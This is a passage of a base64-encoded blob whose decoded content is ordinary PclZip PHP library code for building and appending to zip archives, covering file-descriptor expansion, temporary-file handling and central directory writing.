UUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gU3RyaW5nIGV4cGVjdGVkIGZvciBhdHRyaWJ1dGUgJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHZfa2V5KS4iJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHBfZmlsZWRlc2NyWyduZXdfZnVsbF9uYW1lJ10gPSBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkdl92YWx1ZSk7DQoNCiAgICAgICAgaWYgKCRwX2ZpbGVkZXNjclsnbmV3X2Z1bGxfbmFtZSddID09ICcnKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgZW1wdHkgZnVsbCBmaWxlbmFtZSBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0FUVF9GSUxFX0NPTU1FTlQgOg0KICAgICAgICBpZiAoIWlzX3N0cmluZygkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gU3RyaW5nIGV4cGVjdGVkIGZvciBhdHRyaWJ1dGUgJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHZfa2V5KS4iJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHBfZmlsZWRlc2NyWydjb21tZW50J10gPSAkdl92YWx1ZTsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9BVFRfRklMRV9NVElNRSA6DQogICAgICAgIGlmICghaXNfaW50ZWdlcigkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gSW50ZWdlciBleHBlY3RlZCBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVkZXNjclsnbXRpbWUnXSA9ICR2X3ZhbHVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0FUVF9GSUxFX0NPTlRFTlQgOg0KICAgICAgICAkcF9maWxlZGVzY3JbJ2NvbnRlbnQnXSA9ICR2X3ZhbHVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGRlZmF1bHQgOg0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLA0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICJVbmtub3duIHBhcmFtZXRlciAnIi4kdl9rZXkuIiciKTsNCg0KICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICBpZiAoJHZfcmVxdWVzdGVkX29wdGlvbnMgIT09IGZhbHNlKSB7DQogICAgICBmb3IgKCRrZXk9cmVzZXQoJHZfcmVxdWVzdGVkX29wdGlvbnMpOyAka2V5PWtleSgkdl9yZXF1ZXN0ZWRfb3B0aW9ucyk7ICRrZXk9bmV4dCgkdl9yZXF1ZXN0ZWRfb3B0aW9ucykpIHsNCiAgICAgICAgaWYgKCR2X3JlcXVlc3RlZF9vcHRpb25zWyRrZXldID09ICdtYW5kYXRvcnknKSB7DQogICAgICAgICAgaWYgKCFpc3NldCgkcF9maWxlX2xpc3RbJGtleV0pKSB7DQogICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiTWlzc2luZyBtYW5kYXRvcnkgcGFyYW1ldGVyICIuUGNsWmlwVXRpbE9wdGlvblRleHQoJGtleSkuIigiLiRrZXkuIikiKTsNCiAgICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgDQogIH0NCiAgDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZGaWxlRGVzY3JFeHBhbmQoJiRwX2ZpbGVkZXNjcl9saXN0LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICAkdl9yZXN1bHRfbGlzdCA9IGFycmF5KCk7DQogIA0KICBmb3IgKCRpPTA7ICRpPHNpemVvZigkcF9maWxlZGVzY3JfbGlzdCk7ICRpKyspIHsNCiAgICANCiAgICAkdl9kZXNjciA9ICRwX2ZpbGVkZXNjcl9saXN0WyRpXTsNCiAgICANCiAgICAkdl9kZXNjclsnZmlsZW5hbWUnXSA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKCR2X2Rlc2NyWydmaWxlbmFtZSddLCBmYWxzZSk7DQogICAgJHZfZGVzY3JbJ2ZpbGVuYW1lJ10gPSBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkdl9kZXNjclsnZmlsZW5hbWUnXSk7DQogICAgDQogICAgaWYgKGZpbGVfZXhpc3RzKCR2X2Rlc2NyWydmaWxlbmFtZSddKSkgew0KICAgICAgaWYgKEBpc19maWxlKCR2X2Rlc2NyWydmaWxlbmFtZSddKSkgew0KICAgICAgICAkdl9kZXNjclsndHlwZSddID0gJ2ZpbGUnOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoQGlzX2Rpcigkdl9kZXNjclsnZmlsZW5hbWUnXSkpIHsNCiAgICAgICAgJHZfZGVzY3JbJ3R5cGUnXSA9ICdmb2xkZXInOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoQGlzX2xpbmsoJHZfZGVzY3JbJ2ZpbGVuYW1lJ10pKSB7DQogICAgICAgIGNvbnRpbnVlOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQogICAgICAgIGNvbnRpbnVlOw0KICAgICAgfQ0KICAgIH0NCiAgICANCiAgICBlbHNlIGlmIChpc3NldCgkdl9kZXNjclsnY29udGVudCddKSkgew0KICAgICAgJHZfZGVzY3JbJ3R5cGUnXSA9ICd2aXJ0dWFsX2ZpbGUnOw0KICAgIH0NCiAgICANCiAgICBlbHNlIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19GSUxFLCAiRmlsZSAnIi4kdl9kZXNjclsnZmlsZW5hbWUnXS4iJyBkb2VzIG5vdCBleGlzdCIpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQogICAgDQogICAgJHRoaXMtPnByaXZDYWxjdWxhdGVTdG9yZWRGaWxlbmFtZSgkdl9kZXNjciwgJHBfb3B0aW9ucyk7DQogICAgDQogICAgJHZfcmVzdWx0X2xpc3Rbc2l6ZW9mKCR2X3Jlc3VsdF9saXN0KV0gPSAkdl9kZXNjcjsNCiAgICANCiAgICBpZiAoJHZfZGVzY3JbJ3R5cGUnXSA9PSAnZm9sZGVyJykgew0KICAgICAgJHZfZGlybGlzdF9kZXNjciA9IGFycmF5KCk7DQogICAgICAkdl9kaXJsaXN0X25iID0gMDsNCiAgICAgIGlmICgkdl9mb2xkZXJfaGFuZGxlciA9IEBvcGVuZGlyKCR2X2Rlc2NyWydmaWxlbmFtZSddKSkgew0KICAgICAgICB3aGlsZSAoKCR2X2l0ZW1faGFuZGxlciA9IEByZWFkZGlyKCR2X2ZvbGRlcl9oYW5kbGVyKSkgIT09IGZhbHNlKSB7DQoNCiAgICAgICAgICBpZiAoKCR2X2l0ZW1faGFuZGxlciA9PSAnLicpIHx8ICgkdl9pdGVtX2hhbmRsZXIgPT0gJy4uJykpIHsNCiAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgfQ0KICAgICAgICAgIA0KICAgICAgICAgICR2X2Rpcmxpc3RfZGVzY3JbJHZfZGlybGlzdF9uYl1bJ2ZpbGVuYW1lJ10gPSAkdl9kZXNjclsnZmlsZW5hbWUnXS4nLycuJHZfaXRlbV9oYW5kbGVyOw0KICAgICAgICAgIA0KICAgICAgICAgIGlmICgoJHZfZGVzY3JbJ3N0b3JlZF9maWxlbmFtZSddICE9ICR2X2Rlc2NyWydmaWxlbmFtZSddKQ0KICAgICAgICAgICAgICAgJiYgKCFpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpKSB7DQogICAgICAgICAgICBpZiAoJHZfZGVzY3JbJ3N0b3JlZF9maWxlbmFtZSddICE9ICcnKSB7DQogICAgICAgICAgICAgICR2X2Rpcmxpc3RfZGVzY3JbJHZfZGlybGlzdF9uYl1bJ25ld19mdWxsX25hbWUnXSA9ICR2X2Rlc2NyWydzdG9yZWRfZmlsZW5hbWUnXS4nLycuJHZfaXRlbV9oYW5kbGVyOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICR2X2Rpcmxpc3RfZGVzY3JbJHZfZGlybGlzdF9uYl1bJ25ld19mdWxsX25hbWUnXSA9ICR2X2l0ZW1faGFuZGxlcjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgDQogICAgICAgICAgJHZfZGlybGlzdF9uYisrOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBAY2xvc2VkaXIoJHZfZm9sZGVyX2hhbmRsZXIpOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQogICAgICB9DQogICAgICANCiAgICAgIGlmICgkdl9kaXJsaXN0X25iICE9IDApIHsNCiAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkZpbGVEZXNjckV4cGFuZCgkdl9kaXJsaXN0X2Rlc2NyLCAkcF9vcHRpb25zKSkgIT0gMSkgew0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICR2X3Jlc3VsdF9saXN0ID0gYXJyYXlfbWVyZ2UoJHZfcmVzdWx0X2xpc3QsICR2X2Rpcmxpc3RfZGVzY3IpOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQogICAgICB9DQogICAgICAgIA0KICAgICAgdW5zZXQoJHZfZGlybGlzdF9kZXNjcik7DQogICAgfQ0KICB9DQogIA0KICAkcF9maWxlZGVzY3JfbGlzdCA9ICR2X3Jlc3VsdF9saXN0Ow0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZDcmVhdGUoJHBfZmlsZWRlc2NyX2xpc3QsICYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICAkdl9saXN0X2RldGFpbCA9IGFycmF5KCk7DQogIA0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZPcGVuRmQoJ3diJykpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZBZGRMaXN0KCRwX2ZpbGVkZXNjcl9saXN0LCAkcF9yZXN1bHRfbGlzdCwgJHBfb3B0aW9ucyk7DQoNCiAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkFkZCgkcF9maWxlZGVzY3JfbGlzdCwgJiRwX3Jlc3VsdF9saXN0LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogICR2X2xpc3RfZGV0YWlsID0gYXJyYXkoKTsNCg0KICBpZiAoKCFpc19maWxlKCR0aGlzLT56aXBuYW1lKSkgfHwgKGZpbGVzaXplKCR0aGlzLT56aXBuYW1lKSA9PSAwKSkNCiAgew0KDQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZDcmVhdGUoJHBfZmlsZWRlc2NyX2xpc3QsICRwX3Jlc3VsdF9saXN0LCAkcF9vcHRpb25zKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCiAgJHRoaXMtPnByaXZEaXNhYmxlTWFnaWNRdW90ZXMoKTsNCg0KICBpZiAoKCR2X3Jlc3VsdD0kdGhpcy0+cHJpdk9wZW5GZCgncmInKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KDQogICR2X3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLnRtcCc7DQoNCiAgaWYgKCgkdl96aXBfdGVtcF9mZCA9IEBmb3Blbigkdl96aXBfdGVtcF9uYW1lLCAnd2InKSkgPT0gMCkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl96aXBfdGVtcF9uYW1lLidcJyBpbiBiaW5hcnkgd3JpdGUgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9zaXplID0gJHZfY2VudHJhbF9kaXJbJ29mZnNldCddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdl96aXBfdGVtcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfc3dhcCA9ICR0aGlzLT56aXBfZmQ7DQogICR0aGlzLT56aXBfZmQgPSAkdl96aXBfdGVtcF9mZDsNCiAgJHZfemlwX3RlbXBfZmQgPSAkdl9zd2FwOw0KDQogICR2X2hlYWRlcl9saXN0ID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZEZpbGVMaXN0KCRwX2ZpbGVkZXNjcl9saXN0LCAkdl9oZWFkZXJfbGlzdCwgJHBfb3B0aW9ucykpICE9IDEpDQogIHsNCiAgICBmY2xvc2UoJHZfemlwX3RlbXBfZmQpOw0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfb2Zmc2V0ID0gQGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KDQogICR2X3NpemUgPSAkdl9jZW50cmFsX2Rpclsnc2l6ZSddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdl96aXBfdGVtcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogIGZvciAoJGk9MCwgJHZfY291bnQ9MDsgJGk8c2l6ZW9mKCR2X2hlYWRlcl9saXN0KTsgJGkrKykNCiAgew0KICAgIGlmICgkdl9oZWFkZXJfbGlzdFskaV1bJ3N0YXR1cyddID09ICdvaycpIHsNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUNlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcl9saXN0WyRpXSkpICE9IDEpIHsNCiAgICAgICAgZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCiAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQogICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQogICAgICAkdl9jb3VudCsrOw0KICAgIH0NCg0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXJfbGlzdFskaV0sICRwX3Jlc3VsdF9saXN0WyRpXSk7DQogIH0NCg0KICAkdl9jb21tZW50ID0gJHZfY2VudHJhbF9kaXJbJ2NvbW1lbnQnXTsNCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9DT01NRU5UXSkpIHsNCiAgICAkdl9jb21tZW50ID0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0NPTU1FTlRdOw0KICB9DQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQUREX0NPTU1FTlRdKSkgew0KICAgICR2X2NvbW1lbnQgPSAkdl9jb21tZW50LiRwX29wdGlvbnNbUENMWklQX09QVF9BRERfQ09NTUVOVF07DQogIH0NCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9QUkVQRU5EX0NPTU1FTlRdKSkgew0KICAgICR2X2NvbW1lbnQgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfUFJFUEVORF9DT01NRU5UXS4kdl9jb21tZW50Ow0KICB9DQoNCiAgJHZfc2l6ZSA9IEBmdGVsbCgkdGhpcy0+emlwX2ZkKS0kdl9vZmZzZXQ7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEhlYWRlcigkdl9jb3VudCskdl9jZW50cmFsX2RpclsnZW50cmllcyddLCAkdl9zaXplLCAkdl9vZmZzZXQsICR2X2NvbW1lbnQpKSAhPSAxKQ0KICB7DQogICAgdW5zZXQoJHZfaGVhZGVyX2xpc3QpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X3N3YXAgPSAkdGhpcy0+emlwX2ZkOw0KICAkdGhpcy0+emlwX2ZkID0gJHZfemlwX3RlbXBfZmQ7DQogICR2X3ppcF90ZW1wX2ZkID0gJHZfc3dhcDsNCg0KICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICBAZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCg0KICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICBAdW5saW5rKCR0aGlzLT56aXBuYW1lKTsNCg0KICBQY2xaaXBVdGlsUmVuYW1lKCR2X3ppcF90ZW1wX25hbWUsICR0aGlzLT56aXBuYW1lKTsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2T3BlbkZkKCRwX21vZGUpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICgkdGhpcy0+emlwX2ZkICE9IDApDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnWmlwIGZpbGUgXCcnLiR0aGlzLT56aXBuYW1lLidcJyBhbHJlYWR5IG9wZW4nKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgaWYgKCgkdGhpcy0+emlwX2ZkID0gQGZvcGVuKCR0aGlzLT56aXBuYW1lLCAkcF9tb2RlKSkgPT0gMCkNCiAgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiBhcmNoaXZlIFwnJy4kdGhpcy0+emlwbmFtZS4nXCcgaW4gJy4kcF9tb2RlLicgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2Q2xvc2VGZCgpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICgkdGhpcy0+emlwX2ZkICE9IDApDQogICAgQGZjbG9zZSgkdGhpcy0+emlwX2ZkKTsNCiAgJHRoaXMtPnppcF9mZCA9IDA7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkFkZExpc3QoJHBfZmlsZWRlc2NyX2xpc3QsICYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X2hlYWRlcl9saXN0ID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZEZpbGVMaXN0KCRwX2ZpbGVkZXNjcl9saXN0LCAkdl9oZWFkZXJfbGlzdCwgJHBfb3B0aW9ucykpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfb2Zmc2V0ID0gQGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KDQogIGZvciAoJGk9MCwkdl9jb3VudD0wOyAkaTxzaXplb2YoJHZfaGVhZGVyX2xpc3QpOyAkaSsrKQ0KICB7DQogICAgaWYgKCR2X2hlYWRlcl9saXN0WyRpXVsnc3RhdHVzJ10gPT0gJ29rJykgew0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEZpbGVIZWFkZXIoJHZfaGVhZGVyX2xpc3RbJGldKSkgIT0gMSkgew0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KICAgICAgJHZfY291bnQrKzsNCiAgICB9DQoNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyX2xpc3RbJGldLCAkcF9yZXN1bHRfbGlzdFskaV0pOw0KICB9DQoNCiAgJHZfY29tbWVudCA9ICcnOw0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0NPTU1FTlRdKSkgew0KICAgICR2X2NvbW1lbnQgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQ09NTUVOVF07DQogIH0NCg0KICAkdl9zaXplID0gQGZ0ZWxsKCR0aGlzLT56aXBfZmQpLSR2X29mZnNldDsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2V3JpdGVDZW50cmFsSGVhZGVyKCR2X2NvdW50LCAkdl9zaXplLCAkdl9vZmZzZXQsICR2X2NvbW1lbnQpKSAhPSAxKQ0KICB7DQogICAgdW5zZXQoJHZfaGVhZGVyX2xpc3QpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZBZGRGaWxlTGlzdCgkcF9maWxlZGVzY3JfbGlzdCwgJiRwX3Jlc3VsdF9saXN0LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogICR2X2hlYWRlciA9IGFycmF5KCk7DQoNCiAgJHZfbmIgPSBzaXplb2YoJHBfcmVzdWx0X2xpc3QpOw0KDQogIGZvciAoJGo9MDsgKCRqPHNpemVvZigkcF9maWxlZGVzY3JfbGlzdCkpICYmICgkdl9yZXN1bHQ9PTEpOyAkaisrKSB7DQogICAgJHBfZmlsZWRlc2NyX2xpc3RbJGpdWydmaWxlbmFtZSddDQogICAgPSBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkcF9maWxlZGVzY3JfbGlzdFskal1bJ2ZpbGVuYW1lJ10sIGZhbHNlKTsNCiAgICANCg0KICAgIGlmICgkcF9maWxlZGVzY3JfbGlzdFskal1bJ2ZpbGVuYW1lJ10gPT0gIiIpIHsNCiAgICAgIGNvbnRpbnVlOw0KICAgIH0NCg0KICAgIGlmICggICAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gIT0gJ3ZpcnR1YWxfZmlsZScpDQogICAgICAgICYmICghZmlsZV9leGlzdHMoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWydmaWxlbmFtZSddKSkpIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19GSUxFLCAiRmlsZSAnIi4kcF9maWxlZGVzY3JfbGlzdFskal1bJ2ZpbGVuYW1lJ10uIicgZG9lcyBub3QgZXhpc3QiKTsNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgIGlmICggICAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gPT0gJ2ZpbGUnKQ0KICAgICAgICB8fCAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gPT0gJ3ZpcnR1YWxfZmlsZScpDQogICAgICAgIHx8ICggICAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gPT0gJ2ZvbGRlcicpDQogICAgICAgICAgICAmJiAoICAgIWlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEhdKQ0KICAgICAgICAgICAgICAgIHx8ICEkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpDQogICAgICAgICkgew0KDQogICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZEZpbGUoJHBfZmlsZWRlc2NyX2xpc3RbJGpdLCAkdl9oZWFkZXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBfb3B0aW9ucyk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgJHBfcmVzdWx0X2xpc3RbJHZfbmIrK10gPSAkdl9oZWFkZXI7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkFkZEZpbGUoJHBfZmlsZWRlc2NyLCAmJHBfaGVhZGVyLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICAkcF9maWxlbmFtZSA9ICRwX2ZpbGVkZXNjclsnZmlsZW5hbWUnXTsNCg0KICBpZiAoJHBfZmlsZW5hbWUgPT0gIiIpIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiSW52YWxpZCBmaWxlIGxpc3QgcGFyYW1ldGVyIChpbnZhbGlkIG9yIGVtcHR5IGxpc3QpIik7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQoNCiAgY2xlYXJzdGF0Y2FjaGUoKTsNCiA